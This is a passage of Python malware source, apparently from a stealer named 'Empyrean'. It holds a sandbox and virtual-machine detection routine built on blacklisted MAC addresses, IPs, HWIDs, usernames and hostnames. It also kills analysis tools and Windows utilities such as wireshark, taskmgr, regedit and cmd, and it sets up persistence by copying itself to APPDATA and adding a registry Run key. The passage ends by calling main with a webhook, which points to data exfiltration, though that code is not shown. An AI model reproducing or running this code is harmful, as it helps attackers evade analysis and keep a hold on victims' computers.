'00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']
        self.blacklistedProcesses = ["httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]
        
        self.check_process()
        if self.get_network(): debugging = True
        if self.get_system(): debugging = True
  
        return debugging

    def check_process(self):
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in self.blacklistedProcesses):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
     
    def get_network(self):
        ip = requests.get('https://api.ipify.org').text
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        
        if ip in self.blackListedIPS: return True	
        if mac in self.blackListedMacs: return True
        
    def get_system(self):
        hwid = (subprocess.Popen("wmic csproduct get uuid", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.read() + subprocess.Popen("wmic csproduct get uuid", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stderr.read()).decode().split("\n")[1]     
        username = os.getenv("UserName")
        hostname = os.getenv("COMPUTERNAME")
        
        if hwid in self.blackListedHWIDS: return True
        if username in self.blackListedUsers: return True
        if hostname in self.blackListedPCNames: return True
    
    def self_destruct(self):
        exit()

class startup():
    def __init__(self):
        if not self.check(): return
    
        self.Empyrean_dir = self.mk_appdata()
        self.mv_self()
        self.reg_add()
    
    def check(self):
        if os.path.splitext(__file__)[1] == ".exe":
            return True
        else:
            return False
    
    def mk_appdata(self):
        roaming = os.getenv("APPDATA")
        
        shutil.rmtree(roaming + "\\" + "Empyrean") if os.path.exists(roaming + "\\" + "Empyrean") else None
        
        os.mkdir(roaming + "\\" + "Empyrean")
        
        Empyrean_dir = roaming + "\\" + "Empyrean" if os.path.exists(roaming + "\\" + "Empyrean") else None
            
        return Empyrean_dir
    
    def mv_self(self):
        shutil.copy2(__file__, self.Empyrean_dir + "\\" + os.path.basename(__file__))

    def reg_add(self):
        subprocess.call(["reg", "delete", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Empyrean", "/f"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.call(["reg", "add", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Empyrean", "/t", "REG_SZ", "/d", self.Empyrean_dir + "\\" + os.path.basename(__file__)], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
  
if __name__ == "__main__":
    main(webhook)
